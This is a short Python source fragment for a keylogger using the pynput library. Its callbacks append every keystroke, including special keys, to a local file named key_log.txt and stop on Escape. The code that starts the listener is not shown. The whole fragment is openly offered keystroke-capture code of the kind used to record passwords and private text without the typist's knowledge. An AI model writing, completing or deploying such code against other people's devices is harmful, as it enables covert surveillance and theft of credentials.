from pynput.keyboard import Key
# Log file path
log_file = "key_log.txt"

def on_press(key):
    """
    Callback function to handle key press events.
    """
    try:
        with open(log_file, "a") as f:
            f.write(f"He press on :  {key.char}")
    except AttributeError:
        with open(log_file, "a") as f:
            if key == Key.space:
                f.write(" ")
            else:
                f.write(f"This key is press :    {key} ")

def on_release(key):
    """
    Callback function to handle key release events.
    """
    if key == Key.esc:
        # Stop listener
        return False
